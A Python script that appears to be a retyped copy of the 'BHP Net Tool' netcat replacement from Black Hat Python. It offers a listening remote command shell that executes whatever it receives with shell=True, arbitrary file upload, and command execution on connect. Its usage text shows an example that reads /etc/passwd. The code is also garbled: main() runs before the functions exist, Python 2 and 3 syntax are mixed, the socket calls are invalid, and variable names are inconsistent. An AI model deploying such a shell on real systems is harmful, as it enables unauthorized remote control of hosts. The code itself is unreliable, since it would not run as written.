import sys
import socket
import getopt
import threading
import subprocess


# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("BHP Net Tool")
    print()
    print("Usage : bhpnet.py -t target_host -p port ")
    print("-l --listen - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command - initialize a command shell")
    print("-u --upload=destination - upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    try:
        opts,args=getopt.getopt(sys.argv[1:],"hle:t:p:cu:",['help','listen','execute','target','port','command','upload'])
    except:
        print(str(err))

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l",'--listen'):
            listen=True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    if not listen and len(target) and port>0:
        buffer=sys.stdin.read()
        client_sender(buffer)
    if listen:
        server_loop()
main()

def client_sender(buffer):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    try:
        client.connect(target,port)
        if len(buffer):
            client.send(buffer)
        recvlen=1
        response=''

        while  recvlen:
            data=client.recv(4096)
            recvlen=len(data)
            response+=data
            response+='\n'
            if recvlen<4096:
                break
            print response

            buffer=input()
            buffer+="\n"
            client.send(buffer)
    except:
        print('[+]exception .........')
        client.close()


def server_loop():
    global target

    if not len(target):
        target='0.0.0.0'

    server=socket.socket(socket.family=AF_INET,socket.type=SOCK_STREAM)
    server.bind(port)

    server.listen(5)

    while True:
        clien_socket=server.accept()
        clien_thread=threading.Thread(target=client_handler,args=(clien_socket,))
        clien_thread.start()


def run_command(command):
    command=command.rstrip()

    try:
        output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output='failed to execute command\r\n'

    return output
def client_handler(clien_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer=""

        while True:
            data=clien_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer+=data
        try:
            file_descriptor=open(upload_destination,'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully saved file to%s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" %upload_destination)

    if len(execute):
        output=run_command(execute)
        clien_socket.send(output)
    if command:
        while True:
            clien_socket.send(<"BHP:#">)
            cmd_buffer=""

            while '\n' not in cmd_buffer:
                cmd_buffer+=clien_socket.recv(1024)

            response=run_command(cmd_buffer)
            clien_socket.send(response)
